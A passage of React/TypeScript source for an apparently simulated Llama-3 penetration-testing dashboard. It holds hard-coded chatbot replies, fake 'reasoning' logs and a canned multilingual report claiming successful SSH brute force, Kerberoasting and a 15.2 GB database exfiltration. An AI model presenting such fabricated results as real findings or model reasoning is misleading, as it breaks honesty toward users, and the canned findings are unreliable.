  // Custom simulation prompt submit in workspace page B
  const handleSendPrompt = (e: React.FormEvent) => {
    e.preventDefault();
    if (!userChatInput.trim()) return;

    const currentInput = userChatInput;
    setPentestHistory(prev => [...prev, { role: 'user', content: currentInput }]);
    setUserChatInput('');

    // LLM Thinking Simulation
    setReasoningLogs(prev => [
      ...prev,
      `[LLM-INPUT] Analyzing human analyst query: "${currentInput}"`,
      `[REASONER-LLAMA3] Evaluating security constraints... Matching toolset context...`
    ]);

    setTimeout(() => {
      let botResponse = '';
      if (activeLang === 'zh') {
        if (activeEngineMode === 'PentestGPT') {
          botResponse = `滲透決策鏈分析完成。已對主機進行端口探針序列驗證，排除 Garak 紅隊注入威脅。該 IP 連接安全合規。`;
        } else if (activeEngineMode === 'HackingBuddy') {
          botResponse = `HackingBuddy 已為您生成最新合規測試腳本。請在安全沙箱內調試，監聽配置設定為本地。`;
        } else {
          botResponse = `CAI 自動化威脅阻斷任務已下發。已成功下發全新 IPTABLES 策略，攔截來自該異常鏈段的傳輸包。`;
        }
      } else if (activeLang === 'ja') {
        if (activeEngineMode === 'PentestGPT') {
          botResponse = `監査コマンドの解析完了。Garakフィルターは正常。PostgreSQL インスタンスに対するパス整合スキャンを通じ安全な通信を確認しました。`;
        } else if (activeEngineMode === 'HackingBuddy') {
          botResponse = `HackingBuddy による自律ペイロードの再ビルドが完了。接続リスナーをローカルホスト宛に再バインドしてください。`;
        } else {
          botResponse = `CAI 自動トラフィックスイープ完了。LDAP への異常アタックボリュームは軽減され、ファイアウォール規則を追加しました。`;
        }
      } else {
        if (activeEngineMode === 'PentestGPT') {
          botResponse = `Command request analyzed. Deploying customized verification sequence to PostgreSQL database utilizing target path. Checking Garak threat evaluation limits... Clean.`;
        } else if (activeEngineMode === 'HackingBuddy') {
          botResponse = `HackingBuddy dynamic payload recommendation successfully refreshed. Please adjust the target listener properties accordingly:`;
        } else {
          botResponse = `CAI automation sequence adjusted. Network defense firewall rules configured to block recursive LDAP query storms.`;
        }
      }

      setPentestHistory(prev => [
        ...prev, 
        { role: 'assistant', content: botResponse, step: 'Simulation Output' }
      ]);
    }, 1200);
  };

  // Target file log simulation loader
  const handleLogFileUpload = () => {
    setUploadedLogFile('suricata-alerts-2026-06.log (12.4 MB)');
    setReasoningLogs(prev => [
      ...prev,
      "[SYSTEM] Successfully parsed uploaded threat log file: suricata-alerts-2026-06.log",
      "[REASONER-LLAMA3] Running telemetry correlations on 124,510 alert registers."
    ]);
  };

  // Page C: Simulated Markdown Report Export
  const getSimulatedReportMarkdown = () => {
    if (activeLang === 'zh') {
      return `# 安全事件防範與滲透性審計報告 (由 LLAMA-3 引擎聯動產出)
---
- **報告產出時間:** ${new Date().toISOString()}
- **稽核分析專家:** 資訊安全威脅搜獵中心 Tier 3 Specialist
- **核心 LLM 推理後端:** Llama-3-8B-Instruct (Ollama Local)
- **演練檢測邊界:** IP 位址: ${targetIP} (${targetDomain})

## 已驗證的安全漏洞鏈與威脅行為
1. **主機間 SSH 登入密碼猜測攻擊 (Mitre T1110.001)**
   - 成功檢測並繞過未加密的主機前端限制。
2. **域伺服器 Kerberoasting 的離線 Hash 搜刮攻擊 (Mitre T1558.003)**
   - 成功提取 LDAP 機密映射，存在雜湊外洩威脅。
3. **數據庫高權限 SQL 任意命令注入 (Mitre T1041)**
   - 透過 PostgreSQL 注入管道流式外傳 15.2 GB 敏感賬目。

## 推薦的加固與安全防護作法
- 為本段子網段配置嚴格的白名單防火牆接收規則。
- 將涉及域控及 SSH 的登入權限全面強制升級至多因子 (2FA) 認證。`;
    } else if (activeLang === 'ja') {
      return `# セキュリティインシデント監査・侵入テスト報告書 (Llama-3 による自動作成)
---
- **監査報告タイムスタンプ:** ${new Date().toISOString()}
- **監査担当役職:** 脅威ハンティングセンター ティア3スペシャリスト
- **利用 LLM 推論コア:** Llama-3-8B-Instruct (Ollama Local)
- **検証テスト範囲:** IP: ${targetIP} (${targetDomain})

## 検証確認された脆弱性の連鎖 (Vulnerability Link)
1. **フロントホストに対する SSH ブルートフォース（Mitre T1110.001）**
   - パスワード不十分により、攻撃可能性を特定。
2. **Active Directory 経由の Kerberoasting 的チケット搾取（Mitre T1558.003）**
   - LDAPアカウント構造のメタ情報を露出。
3. **データベスに対する高権限 SQL 注入攻撃 (Mitre T1041)**
   - PostgreSQL ポート経由での任意のデータ流出エクスプロイトが作動可能。

## セキュリティ対策推奨事項
- データベースポート (5432) インバウンドのアクセス元ホワイトリスト化。
- すべての管理者資格情報に対する 2要素認証 (2FA) の強制導入。`;
    } else {
      return `# SECURITY INCIDENT PENTEST REPORT (GENERATED BY LLAMA-3 INTEGRATION)
---
- **Report Timestamp:** ${new Date().toISOString()}
- **Analyst In Charge:** SOC Tier 3 Specialist
- **Core LLM Backend:** Llama-3-8B-Instruct
- **Target Boundaries:** IP: ${targetIP} (${targetDomain})

## Verified Vulnerability Exploits
1. **Host-to-Host SSH Password guessing (T1110.001)**
   - Successfully bypassed deployer profile restrictions.
2. **Internal Directory Service Kerberoasting query (T1558.003)**
   - Extracted LDAP replicas directory mappings.
3. **Database High Gain Access (T1041)**
   - Injected COPY TO commands, streaming 15.2 GB exfiltrated databases.

## Recommended Fix & Safeguards
- Configure host firewalls with absolute inbound white-lists.
- Restructure all administrative credentials.`;
    }
  };

  return (
    <div className="space-y-6 text-gray-300" id="llama3-sec-workspace">

      {/* Cyberpunk Navigation Panel - Grid Selector */}
      <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4 bg-[#0d1117] border border-gray-800 p-4 rounded-xl shadow-lg">
        <div>
          <div className="flex items-center gap-2">
            <Cpu className="text-[#00FF66] animate-pulse" size={18} />
            <span className="text-xs uppercase font-black tracking-[0.2em] text-[#00FF66]">
              {tVal('title')}
            </span>
          </div>
          <p className="text-[10px] text-gray-500 font-mono mt-1">
            {tVal('subtitle')}
          </p>
        </div>

        {/* Dynamic forced Language Switcher inside View */}
        <div className="flex items-center gap-1.5 bg-black/40 p-1 border border-gray-800 rounded-lg self-end sm:self-auto">
          <Globe className="text-gray-500 w-3.5 h-3.5 ml-1.5" />
          <span className="text-[9px] text-gray-500 uppercase font-black mr-1">Lang:</span>
          {[
            { code: 'auto', label: activeLang === 'zh' ? '自動 (中)' : activeLang === 'ja' ? '自動 (日)' : 'AUTO' },
            { code: 'en', label: 'EN' },
            { code: 'zh', label: '中文' },
            { code: 'ja', label: '日本語' }
          ].map((lang) => (
            <button
              key={lang.code}
              onClick={() => {
                setUserLanguageSelect(lang.code as any);
                if (lang.code !== 'auto') {
                  i18n.changeLanguage(lang.code);
                }
              }}
              className={cn(
                "px-2 py-1 rounded text-[9px] font-black uppercase transition-all cursor-pointer",
                userLanguageSelect === lang.code 
                  ? "bg-[#00FF66]/20 text-[#00FF66] border border-[#00FF66]/30 font-bold"
                  : "text-gray-500 hover:text-gray-200"
              )}
            >
              {lang.label}
            </button>
          ))}
        </div>

        {/* Navigation Tabs */}
        <div className="flex bg-gray-900/80 p-1 border border-gray-800 rounded-lg max-w-full overflow-x-auto">
          {[
            { id: 'A', label: tVal('tabA'), title: 'Page A' },
            { id: 'B', label: tVal('tabB'), title: 'Page B' },
            { id: 'C', label: tVal('tabC'), title: 'Page C' },
            { id: 'config', label: tVal('tabConfig'), title: 'Model API' }
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActivePage(tab.id as any)}
              className={cn(
                "px-3 py-1.5 rounded text-xs font-bold transition-all whitespace-nowrap cursor-pointer",
                activePage === tab.id 
                  ? "bg-[#00FF66]/15 text-[#00FF66] border border-[#00FF66]/30 shadow-md shadow-[#00FF66]/5"
                  : "text-gray-400 hover:text-white hover:bg-gray-800/50"
              )}
            >
              {tab.label}
            </button>
          ))}
        </div>
      </div>

      {/* Page Content Switcher */}
      <div>
        {activePage === 'A' && (
          <div className="space-y-6">
            {/* Page A Layout: Grid System of Status indicators, connections and Target Setup */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">

              {/* Box 1: Llama-3 API Connection Monitor */}
              <div className="bg-[#0f141c] border border-gray-800/80 rounded-xl p-6 relative overflow-hidden group">
                <div className="absolute top-0 right-0 w-32 h-32 bg-[#00FF66]/2 rounded-full blur-3xl pointer-events-none"></div>
                <div className="flex items-center justify-between border-b border-gray-800 pb-4 mb-4">
                  <div className="flex items-center gap-2">
                    <Activity className="text-[#00FF66] animate-pulse" size={16} />
                    <h3 className="text-xs uppercase font-black tracking-widest text-[#00FF66]">
                      {tVal('apiMonitor')}
                    </h3>
                  </div>
                  <div className="flex items-center gap-1.5">
                    <span className="w-2.5 h-2.5 rounded-full bg-[#00FF66] animate-pulse"></span>
                    <span className="text-[10px] uppercase font-black text-white font-mono">{tVal('connected')}</span>
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="flex justify-between items-center bg-black/40 p-3 rounded-lg border border-gray-800/50">
                    <span className="text-xs text-gray-500 font-bold uppercase tracking-wider">{tVal('latency')}</span>
                    <span className="text-sm font-mono font-black text-[#00FF66]">{apiLatency} ms</span>
                  </div>
                  <div className="flex justify-between items-center bg-black/40 p-3 rounded-lg border border-gray-800/50">
                    <span className="text-xs text-gray-500 font-bold uppercase tracking-wider">{tVal('tokenBill')}</span>
                    <span className="text-sm font-mono font-black text-white">{tokensUsed.toLocaleString()} <span className="text-[10px] text-gray-505 font-bold">Tkn</span></span>
                  </div>
                  <div className="flex justify-between items-center bg-black/40 p-3 rounded-lg border border-gray-800/50">
                    <span className="text-xs text-gray-500 font-bold uppercase tracking-wider">{tVal('contextLimit')}</span>
                    <div className="text-right">
                      <span className="text-sm font-mono font-black text-[#FFB000]">{contextWindowPercent}%</span>
                      <span className="text-[9px] block text-gray-500 font-black">{tVal('tokensMax')}</span>
                    </div>
                  </div>
                  <button 
                    onClick={handleTestConnection}
                    disabled={isApiConnecting}
                    className="w-full py-2 bg-gray-900 border border-gray-800 hover:border-[#00FF66]/30 hover:bg-[#00FF66]/5 rounded-lg text-xs font-black uppercase tracking-widest text-gray-300 hover:text-white transition-all flex items-center justify-center gap-2 cursor-pointer"
                  >
                    <RefreshCw className={cn("w-3.5 h-3.5", isApiConnecting && "animate-spin")} />
                    {isApiConnecting ? tVal('pinging') : tVal('testLatencyButton')}
                  </button>
                </div>
              </div>

              {/* Box 2: Agent Tools Activation Center */}
              <div className="bg-[#0f141c] border border-gray-800/80 rounded-xl p-6 relative overflow-hidden">
                <div className="flex items-center justify-between border-b border-gray-800 pb-4 mb-4">
                  <div className="flex items-center gap-2">
                    <Layers className="text-purple-400" size={16} />
                    <h3 className="text-xs uppercase font-black tracking-widest text-purple-400">
                      {tVal('agentEcosystem')}
                    </h3>
                  </div>
                  <span className="text-[9px] uppercase font-black bg-purple-600/10 text-purple-400 border border-purple-500/20 px-2 py-0.5 rounded">
                    Llama-3 Host
                  </span>
                </div>

                <div className="space-y-3">
                  <div className="flex items-center justify-between p-2.5 bg-black/20 rounded-lg border border-gray-800/40">
                    <div className="flex items-center gap-2.5">
                      <div className="w-2.5 h-2.5 rounded-full bg-[#00FF66] shadow-[0_0_6px_#00FF66]"></div>
                      <div>
                        <span className="text-xs font-black text-white block">Cybersecurity AI (CAI)</span>
                        <span className="text-[9px] text-gray-500 font-mono">{tVal('caiDesc')}</span>
                      </div>
                    </div>
                    <span className="text-[10px] font-mono text-gray-400 bg-gray-900 border border-gray-800/80 px-2 py-0.5 rounded">{tVal('activeStatus')}</span>
                  </div>

                  <div className="flex items-center justify-between p-2.5 bg-black/20 rounded-lg border border-gray-800/40">
                    <div className="flex items-center gap-2.5">
                      <div className="w-2.5 h-2.5 rounded-full bg-[#00FF66] shadow-[0_0_6px_#00FF66]"></div>
                      <div>
                        <span className="text-xs font-black text-white block">PentestGPT Mode</span>
                        <span className="text-[9px] text-gray-500 font-mono">{tVal('pentestGPTDesc')}</span>
                      </div>
                    </div>
                    <span className="text-[10px] font-mono text-gray-400 bg-gray-900 border border-gray-800/80 px-2 py-0.5 rounded">{tVal('activeStatus')}</span>
                  </div>

                  <div className="flex items-center justify-between p-2.5 bg-black/20 rounded-lg border border-gray-800/40">
                    <div className="flex items-center gap-2.5">
                      <div className="w-2.5 h-2.5 rounded-full bg-[#00FF66] shadow-[0_0_6px_#00FF66]"></div>
                      <div>
                        <span className="text-xs font-black text-white block">HackingBuddyGPT Module</span>
                        <span className="text-[9px] text-gray-500 font-mono">{tVal('hackingBuddyDesc')}</span>
                      </div>
                    </div>
                    <span className="text-[10px] font-mono text-gray-400 bg-gray-900 border border-gray-800/80 px-2 py-0.5 rounded">{tVal('activeStatus')}</span>
                  </div>
                </div>
              </div>

              {/* Box 3: Live Target Acquisition Settings */}
              <div className="bg-[#0f141c] border border-gray-800/80 rounded-xl p-6 relative overflow-hidden">
                <div className="flex items-center justify-between border-b border-gray-800 pb-4 mb-4">
                  <div className="flex items-center gap-2">
                    <Globe className="text-[#FFB000]" size={16} />
                    <h3 className="text-xs uppercase font-black tracking-widest text-[#FFB000]">
                      {tVal('targetTelemetry')}
                    </h3>
                  </div>
                </div>

                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-3">
                    <div>
                      <label className="text-[9px] block text-gray-500 font-black uppercase mb-1">{tVal('targetIPLabel')}</label>
                      <input 
                        type="text" 
                        value={targetIP}
                        onChange={(e) => setTargetIP(e.target.value)}
                        className="w-full bg-black/60 border border-gray-800 focus:border-[#FFB000]/60 text-xs px-2.5 py-1.5 rounded font-mono text-white outline-none"
                      />
                    </div>
                    <div>
                      <label className="text-[9px] block text-gray-500 font-black uppercase mb-1">{tVal('domainBoundary')}</label>
                      <input 
                        type="text" 
                        value={targetDomain}
                        onChange={(e) => setTargetDomain(e.target.value)}
                        className="w-full bg-black/60 border border-gray-800 focus:border-[#FFB000]/60 text-xs px-2.5 py-1.5 rounded font-mono text-white outline-none"
                      />
                    </div>
                  </div>

                  <div>
                     <label className="text-[9px] block text-gray-500 font-black uppercase mb-1">{tVal('portRange')}</label>
                    <input 
                      type="text" 
                      value={targetPortRange}
                      onChange={(e) => setTargetPortRange(e.target.value)}
                      className="w-full bg-black/60 border border-gray-800 focus:border-[#FFB000]/60 text-xs px-2.5 py-1.5 rounded font-mono text-white outline-none"
                    />
                  </div>

                  <div className="border-t border-gray-800/50 pt-3">
                    <label className="text-[9px] block text-gray-500 font-black uppercase mb-1.5">{tVal('orUploadLogs')}</label>
                    <div className="bg-black/40 border border-dashed border-gray-800 hover:border-gray-700 p-3 rounded-lg text-center cursor-pointer transition-all relative overflow-hidden" onClick={handleLogFileUpload}>
                      <Upload className="w-5 h-5 mx-auto text-gray-500 mb-1" />
                      <span className="text-[10px] text-gray-300 block font-bold">
                        {uploadedLogFile ? uploadedLogFile : tVal('dragDropLogs')}
                      </span>
                      <span className="text-[8px] text-gray-600 block mt-0.5 font-mono">{tVal('supportedFormats')}</span>
                    </div>
                  </div>
                </div>
              </div>

            </div>

            {/* Quick Operational Checklist in Page A */}
            <div className="bg-[#0c1015] border border-gray-800 rounded-xl p-6">
              <h4 className="text-xs font-black uppercase tracking-widest text-[#00FF66] mb-4 flex items-center gap-2">
                <ShieldCheck size={14} /> {tVal('checklistTitle')}
              </h4>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
                <div className="bg-black/35 p-3 rounded border border-gray-800/60 flex items-start gap-2.5">
                  <span className="text-[#00FF66] mt-0.5 font-mono font-black">[✔]</span>
                  <div>
                    <strong className="text-white block font-sans">{tVal('checklistLlama3')}</strong>
                    <span className="text-gray-500 text-[10px] block font-mono mt-0.5">{tVal('checklistLlama3Desc')}</span>
                  </div>
                </div>
                <div className="bg-black/35 p-3 rounded border border-gray-800/60 flex items-start gap-2.5">
                  <span className="text-[#00FF66] mt-0.5 font-mono font-black">[✔]</span>
                  <div>
                    <strong className="text-white block font-sans">{tVal('checklistAgents')}</strong>
                    <span className="text-gray-500 text-[10px] block font-mono mt-0.5">{tVal('checklistAgentsDesc')}</span>
                  </div>
                </div>
                <div className="bg-black/35 p-3 rounded border border-gray-800/60 flex items-start gap-2.5">
                  <span className="text-[#FFB000] mt-0.5 font-mono font-black">[!]</span>
                  <div>
                    <strong className="text-white block font-sans">{tVal('checklistRedTeam')}</strong>
                    <span className="text-gray-550 text-[10px] block font-mono mt-0.5">{tVal('checklistRedTeamDesc')}</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Page B: Unified Security Workspace (Automatic CAI / Guided PentestGPT / Payload generator HackingBuddy) */}
        {activePage === 'B' && (
          <div className="grid grid-cols-1 lg:grid-cols-4 gap-6">
            
            {/* COLUMN 1: Workspace Mode Switcher (Left Column) */}
            <div className="lg:col-span-1 space-y-4">
              <div className="bg-[#0f1420] border border-gray-800/90 rounded-xl p-4">
                <h3 className="text-[10px] font-black uppercase tracking-widest text-gray-500 mb-3 block">
                  {tVal('selectAgentInterface')}
                </h3>

                <div className="space-y-2">
                  <button 
                    onClick={() => setActiveEngineMode('CAI')}
                    className={cn(
                      "w-full text-left p-3 rounded-lg border transition-all cursor-pointer",
                      activeEngineMode === 'CAI'
                        ? "bg-[#00FF66]/10 border-[#00FF66]/50 text-[#00FF66]"
                        : "bg-black/30 border-gray-800 text-gray-400 hover:text-white"
                    )}
                  >
                    <div className="flex items-center gap-2">
                      <Bot size={15} />
                      <span className="text-xs font-black uppercase tracking-wide">{tVal('caiTitle')}</span>
                    </div>
                    <p className="text-[9px] text-gray-500 font-mono mt-1">{tVal('caiShort')}</p>
                  </button>

                  <button 
                    onClick={() => setActiveEngineMode('PentestGPT')}
                    className={cn(
                      "w-full text-left p-3 rounded-lg border transition-all cursor-pointer",
                      activeEngineMode === 'PentestGPT'
                        ? "bg-purple-600/10 border-purple-500/50 text-purple-400"
                        : "bg-black/30 border-gray-800 text-gray-400 hover:text-white"
                    )}
                  >
                    <div className="flex items-center gap-2">
                      <Layers size={15} />
                      <span className="text-xs font-black uppercase tracking-wide">{tVal('pentestTitle')}</span>
                    </div>
                    <p className="text-[9px] text-gray-500 font-mono mt-1">{tVal('pentestShort')}</p>
                  </button>

                  <button 
                    onClick={() => setActiveEngineMode('HackingBuddy')}
                    className={cn(
                      "w-full text-left p-3 rounded-lg border transition-all cursor-pointer",
                      activeEngineMode === 'HackingBuddy'
                        ? "bg-[#FFB000]/10 border-[#FFB000]/50 text-[#FFB000]"
                        : "bg-black/30 border-gray-800 text-gray-400 hover:text-white"
                    )}
                  >
                    <div className="flex items-center gap-2">
                      <Code size={15} />
                      <span className="text-xs font-black uppercase tracking-wide">{tVal('hackingBuddyTitle')}</span>
                    </div>
                    <p className="text-[9px] text-gray-500 font-mono mt-1">{tVal('hackingBuddyShort')}</p>
                  </button>
                </div>
              </div>

              {/* Status information panel in Column 1 */}
              <div className="bg-black/40 border border-gray-800 rounded-xl p-4">
                <div className="flex items-center gap-2 text-xs font-bold text-white mb-2">
                  <Sliders size={13} className="text-purple-400" />
                  <span>{tVal('sessionParams')}</span>
                </div>
                <div className="space-y-2 text-[10px] font-mono">
                  <div className="flex justify-between text-gray-500">
                    <span>{tVal('llmBackbone')}</span>
                    <span className="text-white text-[9px] font-black uppercase">Llama-3-8B</span>
                  </div>
                  <div className="flex justify-between text-gray-500">
                    <span>{tVal('activeTemp')}</span>
                    <span className="text-white">0.2 ({tVal('lowDeviation')})</span>
                  </div>
                  <div className="flex justify-between text-gray-500">
                    <span>{tVal('safeguardMask')}</span>
                    <span className="text-[#00FF66] font-black font-sans">{tVal('safeguardOn')}</span>
                  </div>
                </div>
              </div>
            </div>

            {/* COLUMN 2 & 3: Dynamic Conversation & Reasoning Workspace (Middle Columns) */}
            <div className="lg:col-span-2 space-y-6">
              
              {/* Active Workspace Block */}
              <div className="bg-[#0b0f15] border border-gray-800/80 rounded-xl p-6 flex flex-col min-h-[480px]">
                
                {/* Header of workspace core */}
                <div className="flex items-center justify-between border-b border-gray-800 pb-3 mb-4">
                  <div className="flex items-center gap-2">
                    <span className={cn(
                      "w-2.5 h-2.5 rounded-full",
                      activeEngineMode === 'CAI' ? 'bg-[#00FF66]' :
                      activeEngineMode === 'PentestGPT' ? 'bg-purple-500' : 'bg-[#FFB000]'
                    )}></span>
                    <h3 className="text-xs uppercase font-black tracking-widest text-white">
                      {activeEngineMode === 'CAI' && tVal('interactiveTitleCAI')}
                      {activeEngineMode === 'PentestGPT' && tVal('interactiveTitlePentest')}
                      {activeEngineMode === 'HackingBuddy' && tVal('interactiveTitleHB')}
                    </h3>
                  </div>

                  <span className="text-[9px] font-mono px-2 py-0.5 rounded bg-gray-900 border border-gray-800/80 text-gray-400 font-bold uppercase">
                    {tVal('workspaceState')}
                  </span>
                </div>

                {/* Simulated Content Based on Selection */}
                <div className="flex-1 space-y-4">
                  
                  {activeEngineMode === 'PentestGPT' && (
                    <div className="space-y-4">
                      {/* Dynamic history scrolling logs */}
                      <div className="max-h-[250px] overflow-y-auto space-y-3 pr-2 custom-scrollbar">
                        {pentestHistory.map((item, idx) => (
                          <div 
                            key={idx} 
                            className={cn(
                              "p-3 rounded-lg border text-xs leading-relaxed",
                              item.role === 'system' ? "bg-gray-900/40 border-gray-800/60 text-gray-500 font-mono" :
                              item.role === 'user' ? "bg-purple-600/5 border-purple-500/20 text-gray-200" :
                              "bg-[#0d1625] border-blue-900/30 text-gray-300"
                            )}
                          >
                            <div className="flex items-center gap-1.5 mb-1 text-[9px] font-black uppercase tracking-wider font-sans">
                              {item.role === 'system' && <Terminal size={10} className="text-gray-500" />}
                              {item.role === 'user' && <User size={10} className="text-purple-400" />}
                              {item.role === 'assistant' && <Bot size={10} className="text-blue-400" />}
                              <span>{item.role}</span>
                              {item.step && <span className="text-[#FFB000] font-mono ml-auto">PHASE: {item.step}</span>}
                            </div>
                            <p>{item.content}</p>
                          </div>
                        ))}
                      </div>

                      {/* Interactive Suggested Actions section */}
                      <div className="border-t border-gray-800/60 pt-3">
                        <span className="text-[10px] uppercase font-black tracking-widest text-[#FFB000] block mb-2">
                          {tVal('aiSuggestedActions')}
                        </span>
                        <div className="grid grid-cols-1 gap-2">
                          {getSuggestedActions().map((act) => (
                            <div 
                              key={act.id} 
                              className="p-2.5 bg-black/45 border border-gray-800 hover:border-purple-500/40 rounded-lg group transition-colors flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2"
                            >
                              <div className="space-y-1">
                                <span className="text-[11px] font-black text-gray-200 block">{act.title}</span>
                                <span className="text-[9px] text-gray-500 block">{act.description}</span>
                                <code className="text-[9px] text-[#00FF66] font-mono block bg-black/60 px-1.5 py-0.5 rounded border border-gray-900">{act.cmd}</code>
                              </div>
                              <button 
                                onClick={() => handleExecuteSuggestedAction(act.cmd, act.title)}
                                className="px-3 py-1 bg-purple-600 hover:bg-purple-700 text-white rounded text-[10px] font-black uppercase tracking-wider transition-colors flex items-center gap-1 cursor-pointer self-end sm:self-auto shrink-0"
                              >
                                <Play size={10} /> {activeLang === 'zh' ? '注入命令' : activeLang === 'ja' ? '注入する' : 'Ingest'}
                              </button>
                            </div>
                          ))}
                        </div>
                      </div>
                    </div>
                  )}

                  {activeEngineMode === 'HackingBuddy' && (
                    <div className="space-y-4">
                      <div className="flex items-center gap-2 border-b border-gray-900 pb-2">
                        <span className="text-[10px] uppercase font-black text-gray-400">{tVal('targetScriptLang')}</span>
                        {['sh', 'python', 'sql'].map((t) => (
                           <button
                            key={t}
                            onClick={() => selectPayloadType(t as any)}
                            className={cn(
                              "px-2 py-0.5 text-[9px] rounded font-bold uppercase cursor-pointer",
                              hbPayloadTemplate === t ? "bg-[#FFB000]/20 text-[#FFB000] border border-[#FFB000]/40" : "bg-black/50 text-gray-500"
                            )}
                          >
                            {t}
                          </button>
                        ))}
                      </div>

                      {/* Code Output panel */}
                      <div className="relative group">
                        <pre className="p-4 bg-black/90 border border-gray-800 rounded-lg font-mono text-[10px] text-green-400 overflow-x-auto min-h-[160px] max-h-[220px] custom-scrollbar selection:bg-gray-800">
                          <code>{generatedPayload}</code>
                        </pre>
                        <button 
                          onClick={handleCopyCode}
                          className="absolute right-3 top-3 px-2 py-1 bg-gray-900 hover:bg-gray-800 border border-gray-800 text-[9px] text-gray-300 font-black rounded flex items-center gap-1 cursor-pointer"
                        >
                          {copyFeedback ? <Check className="text-green-400" size={10} /> : <Copy size={10} />}
                          {copyFeedback ? tVal('copied') : tVal('copyPayload')}
                        </button>
                      </div>

                      <div className="bg-[#FFB000]/5 border border-[#FFB000]/20 p-3 rounded-lg flex items-start gap-3">
                        <AlertTriangle className="text-[#FFB000] shrink-0" size={16} />
                        <div>
                          <span className="text-[10px] font-black text-[#FFB000] uppercase block">{tVal('hbComplianceLevel')}</span>
                          <span className="text-[9px] text-gray-400 block mt-0.5">
                            {tVal('hbComplianceDesc')} {targetIP}.
                          </span>
                        </div>
                      </div>
                    </div>
                  )}

                  {activeEngineMode === 'CAI' && (
                    <div className="space-y-4">
                      {/* Active security scanners */}
                      <div className="bg-black/40 border border-gray-900 rounded-lg p-3 space-y-2">
                        <div className="flex justify-between text-[11px]">
                          <span className="text-gray-400 font-bold">{tVal('threatVulnerabilityIndex')}</span>
                          <span className="text-[#00FF66] font-mono">{tVal('sweepingSubnet')}</span>
                        </div>
                        <div className="w-full bg-gray-900 h-1.5 rounded-full overflow-hidden">
                          <div className="bg-[#00FF66] h-full w-[65%] animate-pulse"></div>
                        </div>
                      </div>

                      {/* CAI Auto Sweep results list */}
                      <div className="space-y-2 max-h-[240px] overflow-y-auto pr-2 custom-scrollbar">
                        <div className="bg-[#101512] border border-[#00FF66]/10 p-3 rounded-lg text-xs flex justify-between items-start gap-4">
                          <div className="space-y-1">
                            <span className="text-white font-black">{tVal('caiJobSSH')}</span>
                            <p className="text-[10px] text-gray-500">{tVal('caiJobSSHDesc')}</p>
                          </div>
                          <span className="text-[10px] font-black text-[#00FF66] uppercase">{tVal('running')}</span>
                        </div>
                        <div className="bg-[#121010] border border-red-500/10 p-3 rounded-lg text-xs flex justify-between items-start gap-4">
                          <div className="space-y-1">
                            <span className="text-white font-black">{tVal('caiJobAlert')}</span>
                            <p className="text-[10px] text-gray-550">{tVal('caiJobAlertDesc')}</p>
                          </div>
                          <span className="text-[10px] font-black text-red-400 uppercase">{tVal('exploitable')}</span>
                        </div>
                        <div className="bg-[#131110] border border-orange-500/10 p-3 rounded-lg text-xs flex justify-between items-start gap-4">
                          <div className="space-y-1">
                            <span className="text-white font-black">{tVal('caiJobWarning')}</span>
                            <p className="text-[10px] text-gray-550">{tVal('caiJobWarningDesc')}</p>
                          </div>
                          <span className="text-[10px] font-black text-[#FFB000] uppercase">{tVal('warning')}</span>
                        </div>
                      </div>
                    </div>
                  )}

                </div>

                {/* Common Interactive Input Area (Bottom of Middle Column) */}
                <form onSubmit={handleSendPrompt} className="mt-4 border-t border-gray-800/60 pt-3 relative">
                  <div className="relative">
                    <input 
                      type="text" 
                      value={userChatInput}
                      onChange={(e) => setUserChatInput(e.target.value)}
                      placeholder={tVal('instructLlama')} 
                      className="w-full bg-black/60 border border-gray-800 focus:border-purple-500 text-xs px-3.5 py-2.5 rounded-lg text-white outline-none placeholder:text-gray-600 font-mono"
                    />
                    <button 
                      type="submit" 
                      className="absolute right-2 top-1/2 -translate-y-1/2 bg-purple-600 hover:bg-purple-700 text-white p-1 rounded transition-colors cursor-pointer"
                    >
                      <ArrowRight size={14} />
                    </button>
                  </div>
                </form>

              </div>

            </div>

            {/* COLUMN 4: Llama-3 Raw Reasoning Log Panel (Right Column) */}
            <div className="lg:col-span-1 space-y-4">
              <div className="bg-black border border-gray-800 rounded-xl p-4 flex flex-col h-[480px]">
                <div className="flex items-center justify-between border-b border-gray-900 pb-2.5 mb-3">
                  <div className="flex items-center gap-1.5">
                    <Terminal size={12} className="text-[#00FF66] animate-pulse" />
                    <span className="text-[9px] tracking-widest uppercase text-[#00FF66] font-black">
                      Llama-3 Raw Reasoning Log
                    </span>
                  </div>
                  <div className="flex items-center gap-1 bg-[#00FF66]/10 px-1.5 py-0.5 rounded border border-[#00FF66]/20">
                    <span className="w-1.5 h-1.5 bg-[#00FF66] rounded-full animate-ping"></span>
                    <span className="text-[8px] font-mono font-bold text-[#00FF66] uppercase">AUDIT CHNL</span>
                  </div>
                </div>

                <div className="flex-1 overflow-y-auto space-y-2 pr-1 text-[9px] font-mono leading-normal select-text custom-scrollbar text-gray-400">
                  {reasoningLogs.map((log, idx) => {
                    let colorClass = "text-gray-400";
                    if (log.startsWith("[SYSTEM]")) colorClass = "text-yellow-500 font-bold";
                    else if (log.startsWith("[REASONER")) colorClass = "text-[#00FF66]";
                    else if (log.includes("ALERT") || log.includes("EXPLICIT") || log.includes("Lazarus") || log.includes("高危")) colorClass = "text-red-400 font-bold";
                    else if (log.startsWith("[AGENT")) colorClass = "text-purple-400";
                    
                    return (
                      <div key={idx} className="transition-all hover:bg-gray-900/50 p-0.5 rounded">
                        <span className={colorClass}>{log}</span>
                      </div>
                    );
                  })}
                </div>

                <div className="border-t border-gray-900 pt-2 bg-black text-[8px] text-gray-500 font-bold uppercase flex justify-between tracking-wider font-mono">
                  <span>Stream Feed Rate: 1.2k/s</span>
                  <span>SSL SECURED BY Meta</span>
                </div>
              </div>
            </div>

          </div>
        )}

        {/* Page C: Comprehensive Audit & Report Vector (PDF Exporter + Interactive Path Visuals) */}
        {activePage === 'C' && (
          <div className="space-y-8" id="audit-pdf-exporter-panel">
            
            {/* COLUMN 1: Llama-3 Derived Vulnerability Map (Security Attack Tree) */}
            <SecurityAttackTree 
              activeLang={activeLang}
              onExecuteMitigation={(cmd, nodeName) => {
                setReasoningLogs(prev => [
                  ...prev,
                  `[MITIGATION-DEPLOY] Executed hardening playbook on node: ${nodeName}`,
